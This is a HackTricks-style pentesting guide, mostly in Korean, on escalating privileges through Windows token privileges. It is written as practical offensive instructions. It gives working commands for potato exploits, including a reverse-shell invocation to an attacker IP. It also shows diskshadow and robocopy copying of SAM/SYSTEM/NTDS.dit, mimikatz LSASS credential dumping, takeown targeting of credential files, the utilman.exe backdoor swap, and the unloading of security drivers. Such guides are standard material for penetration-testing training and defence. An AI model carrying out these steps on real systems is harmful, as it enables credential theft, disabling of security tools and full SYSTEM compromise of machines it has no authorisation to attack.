# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

If you **don't know what are Windows Access Tokens** read this page before continuing:


{{#ref}}
access-tokens.md
{{#endref}}

**아마도 이미 가지고 있는 tokens를 악용해서 privileges를 escalate할 수 있을지도 모릅니다**

### SeImpersonatePrivilege

이 privilege는 어떤 process든 가지고 있을 수 있으며, handle을 얻을 수 있는 경우 모든 token의 impersonation(creation은 아님)을 허용합니다. Privileged token은 exploit에 대해 NTLM authentication을 수행하도록 유도함으로써 Windows service(DCOM)에서 획득할 수 있으며, 이후 SYSTEM privileges로 process 실행을 가능하게 합니다. 이 vulnerability는 [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (winrm가 비활성화되어 있어야 함), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 같은 다양한 tools로 exploit할 수 있습니다.

Modern operator notes:

- **JuicyPotato is legacy**: Windows 10 1809+/Server 2019+에서는, 아직 reachable한 RPC/COM surface에 따라 **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, 또는 **PrintSpoofer**를 우선 사용하세요.
- 만약 **`LOCAL SERVICE`** 또는 **`NETWORK SERVICE`**로 실행 중인 service를 compromise했고 `whoami /priv`가 **SeImpersonatePrivilege**/**SeAssignPrimaryTokenPrivilege**가 없는 **filtered token**을 보여준다면, 먼저 해당 account의 **default privilege set**을 복구하고(예: **FullPowers** 사용) 이후 potato family를 다시 시도하세요.
- 일부 newer forks는 원본 tools보다 operator-friendly합니다. 예를 들어, **SigmaPotato**는 reflection/in-memory execution과 최신 Windows 호환성을 추가했고, **PrintNotifyPotato**는 PrintNotify COM service를 abuse하며 classic Spooler path가 비활성화된 경우 종종 유용합니다.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

이는 **SeImpersonatePrivilege**와 매우 유사하며, **같은 방법**을 사용해 권한이 있는 token을 얻습니다.\
그다음, 이 privilege는 새롭거나 suspended된 process에 **primary token을 할당**할 수 있게 해줍니다. 권한 있는 impersonation token이 있으면 primary token을 파생할 수 있습니다(DuplicateTokenEx).\
이 token으로 'CreateProcessAsUser'를 사용해 **새 process**를 만들거나, process를 suspended 상태로 만든 뒤 **token을 설정**할 수 있습니다(일반적으로 실행 중인 process의 primary token은 수정할 수 없습니다).

### SeTcbPrivilege

이 token이 enabled되어 있으면 **KERB_S4U_LOGON**을 사용해 자격 증명을 알지 못해도 다른 어떤 user에 대해서도 **impersonation token**을 얻을 수 있고, token에 임의의 group(admins)을 **추가**할 수 있으며, token의 **integrity level**을 "**medium**"으로 설정하고, 이 token을 **current thread**에 할당할 수 있습니다(SetThreadToken).

### SeBackupPrivilege

이 privilege는 시스템이 어떤 file에 대해서도(read operations에 한정) **모든 read access** control을 부여하도록 합니다. 이는 registry에서 local Administrator 계정의 password hashes를 **읽는** 데 사용되며, 이후 "**psexec**" 또는 "**wmiexec**" 같은 tools를 hash와 함께 사용할 수 있습니다(Pass-the-Hash technique). 하지만 이 technique는 두 가지 조건에서 실패합니다. Local Administrator account가 disabled된 경우, 또는 원격으로 연결하는 Local Administrators에게서 administrative rights를 제거하는 policy가 적용된 경우입니다.\
실무에서 가장 신뢰할 수 있는 built-in workflow는 보통 **VSS + `robocopy /b`**입니다: shadow copy를 만들거나 노출한 다음, **backup mode**로 `SAM`/`SYSTEM` 또는 `NTDS.dit`를 복사하면 file ACLs를 우회할 수 있습니다.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

이 권한은 파일의 Access Control List (ACL)과 무관하게, 어떤 시스템 파일이든 **쓰기 권한**을 제공합니다. 이는 **services 수정**, DLL Hijacking 수행, 그리고 Image File Execution Options를 통해 **debuggers**를 설정하는 것 등 다양한 EoP 기회를 열어줍니다.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege는 강력한 권한으로, 특히 사용자가 token을 impersonate할 수 있는 능력을 가지고 있을 때 유용하며, SeImpersonatePrivilege가 없어도 사용할 수 있습니다. 이 기능은 같은 사용자를 나타내고 현재 process의 integrity level을 초과하지 않는 token을 impersonate할 수 있는 능력에 달려 있습니다.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** 특정 조건에서는 SeCreateTokenPrivilege를 활용해 EoP를 위해 tokens를 impersonate할 수 있습니다.
- **Conditions for Token Impersonation:** 성공적인 impersonation에는 대상 token이 같은 사용자에 속하고, impersonation을 시도하는 process의 integrity level 이하의 integrity level을 가져야 합니다.
- **Creation and Modification of Impersonation Tokens:** 사용자는 impersonation token을 만들고, privileged group의 SID (Security Identifier)를 추가해 이를 강화할 수 있습니다.

### SeLoadDriverPrivilege

이 권한은 `ImagePath`와 `Type`에 특정 값을 가진 registry entry를 생성하여 device drivers를 **load and unload**할 수 있게 해줍니다. `HKLM` (HKEY_LOCAL_MACHINE)에 대한 직접 쓰기 권한은 제한되어 있으므로 대신 `HKCU` (HKEY_CURRENT_USER)를 사용해야 합니다. 하지만 kernel이 driver configuration을 위해 `HKCU`를 인식하도록 하려면, 특정 path를 따라야 합니다.

Modern offensive use is usually **BYOVD** (bring your own vulnerable driver): load a **signed but vulnerable** kernel driver and then use its IOCTLs to disable protections or jump to kernel code execution. Keep in mind that on recent Windows 11/Server builds the **Microsoft vulnerable driver blocklist** and/or **HVCI/Memory Integrity** often break older public chains, so the classic `szkg64.sys`-style examples are no longer universally reliable.

이 path는 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`이며, 여기서 `<RID>`는 현재 사용자의 Relative Identifier입니다. `HKCU` 내부에서 이 전체 path를 생성해야 하며, 두 값을 설정해야 합니다:

- `ImagePath`, 실행할 binary의 path
- `Type`, 값은 `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. 쓰기 권한이 제한되어 있으므로 `HKLM` 대신 `HKCU`에 접근합니다.
2. `HKCU` 내에 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` path를 생성합니다. 여기서 `<RID>`는 현재 사용자의 Relative Identifier를 의미합니다.
3. `ImagePath`를 binary의 execution path로 설정합니다.
4. `Type`을 `SERVICE_KERNEL_DRIVER` (`0x00000001`)로 지정합니다.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
이 권한을 악용하는 더 많은 방법은 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

이것은 **SeRestorePrivilege**와 유사하다. 주요 기능은 프로세스가 **객체의 소유권을 인수**할 수 있게 하며, WRITE_OWNER access rights 제공을 통해 명시적인 discretionary access가 필요하다는 요구를 우회한다. 이 과정은 먼저 쓰기 목적을 위해 대상 registry key의 소유권을 확보한 다음, DACL을 변경하여 write operations를 가능하게 하는 것이다.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

이 권한은 **다른 프로세스를 디버그**할 수 있게 하며, 메모리의 읽기와 쓰기도 포함합니다. 이 권한을 사용하면 대부분의 antivirus와 host intrusion prevention 솔루션을 회피할 수 있는 다양한 memory injection 전략을 사용할 수 있습니다.

modern Windows에서는 `SeDebugPrivilege`만으로도 보통 **protected되지 않은 SYSTEM process**를 열고 그 token을 duplicate할 수 있지만, 이것이 곧바로 **LSASS**에 접근할 수 있다는 보장은 아닙니다. **RunAsPPL / LSA Protection**이 활성화되어 있으면, non-protected process는 `SeDebugPrivilege`가 있어도 LSASS를 읽거나 inject할 수 없습니다. 이런 경우에는 다른 non-PPL SYSTEM process의 token을 훔치거나, `procdump`가 동작할 것이라고 가정하지 말고 PPL bypass/BYOVD와 연계하세요. `SeDebugPrivilege` + `SeImpersonatePrivilege`를 사용한 전체 token-copy 예시는 [this page](sedebug-+-seimpersonate-copy-token.md)를 확인하세요.

#### Dump memory

[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)를 [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)에서 사용하여 프로세스의 **memory를 capture**할 수 있습니다. 특히 이는 시스템에 성공적으로 로그인한 후 사용자 credentials를 저장하는 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process에 적용될 수 있습니다.

그런 다음 이 dump를 mimikatz에 로드하여 passwords를 얻을 수 있습니다:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

`NT SYSTEM` shell을 얻고 싶다면 다음을 사용할 수 있습니다:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

이 권한(Perform volume maintenance tasks)은 raw volume device handles(예: \\.\C:)를 열어 NTFS ACLs를 우회하는 직접 디스크 I/O를 수행할 수 있게 해줍니다. 이를 통해 기본 블록을 읽어서 volume 위의 어떤 파일이든 바이트 단위로 복사할 수 있으며, 민감한 자료(예: %ProgramData%\Microsoft\Crypto\의 machine private keys, registry hives, VSS를 통한 SAM/NTDS)에 대한 arbitrary file read가 가능해집니다. 특히 CA servers에서는 CA private key를 exfiltrating하면 Golden Certificate를 forging하여 어떤 principal이든 impersonate할 수 있게 되므로 매우 큰 영향을 미칩니다.

자세한 기법과 mitigations는 다음을 보세요:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
**Disabled**로 표시되는 토큰은 보통 활성화할 수 있으므로, _Enabled_와 _Disabled_ 권한을 모두 악용할 수 있는 경우가 많습니다.

### 모든 토큰 활성화

비활성화된 권한이 있다면, 스크립트 [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)를 사용해 모든 토큰을 활성화할 수 있습니다:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Windows token에 대한 전체 권한 cheatsheet는 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)에서 확인할 수 있으며, 아래 요약은 관리자 세션을 얻거나 민감한 파일을 읽기 위해 해당 권한을 직접 악용하는 방법만 나열합니다.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | 업데이트해 주신 [Aurélien Chalot](https://twitter.com/Defte_) 감사합니다. 곧 더 recipe-like하게 다시 표현해 보겠습니다.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` 또는 전용 SeBackup-aware copy helper로 민감한 파일을 읽을 수 있습니다.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, 그리고 때로는 `%WINDIR%\MEMORY.DMP`에 매우 유용합니다.<br><br>- `robocopy`는 편리하지만, 잠겨 있거나 열린 파일에는 전용 SeBackup cmdlet/API가 더 유연한 경우가 많습니다.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken`으로 로컬 관리자 권한을 포함한 임의의 token을 생성합니다.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** SYSTEM token을 복제하거나 non-protected process에서 memory를 dump합니다.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection이 활성화되어 있으면 LSASS dumping은 일반적으로 차단됩니다.</p><p>Script는 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)에서 찾을 수 있습니다.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation을 사용해 SYSTEM을 실행합니다(`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>IIS APPPOOL, MSSQL, scheduled tasks 같은 service account나 이미 `SeImpersonatePrivilege`를 가진 어떤 컨텍스트에서도 가장 실용적입니다.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. 서명되어 있지만 취약한 kernel driver를 로드합니다(BYOVD)<br>2. driver의 IOCTL을 사용해 kernel R/W를 얻고, security tooling을 비활성화하거나 SYSTEM으로 elevate합니다<br><br>대안으로, 이 privilege는 <code>fltMC</code> builtin command, 즉 <code>fltMC sysmondrv</code>를 사용해 security 관련 driver를 unload하는 데도 사용될 수 있습니다</p>                     | <p><code>szkg64.sys</code> 같은 오래된 public driver는 vulnerable-driver blocklist / HVCI 때문에 최신 Windows에서 점점 더 차단됩니다.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege가 있는 상태로 PowerShell/ISE를 실행합니다.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>로 privilege를 활성화합니다).<br>3. utilman.exe를 utilman.old로 이름 변경합니다<br>4. cmd.exe를 utilman.exe로 이름 변경합니다<br>5. console을 잠그고 Win+U를 누릅니다</p> | <p>이 공격은 일부 AV software에 의해 탐지될 수 있습니다.</p><p>대체 방법은 동일한 privilege를 사용해 "Program Files"에 저장된 service binary를 교체하는 데 의존합니다</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe를 utilman.exe로 이름 변경합니다<br>4. console을 잠그고 Win+U를 누릅니다</p>                                                                                                                                       | <p>이 공격은 일부 AV software에 의해 탐지될 수 있습니다.</p><p>대체 방법은 동일한 privilege를 사용해 "Program Files"에 저장된 service binary를 교체하는 데 의존합니다.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>token을 조작해 local admin 권한이 포함되도록 합니다. SeImpersonate가 필요할 수 있습니다.</p><p>확인이 필요합니다.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Windows token을 정의한 이 table를 확인하세요: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- token을 이용한 privesc에 대한 [**이 paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)를 확인하세요.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
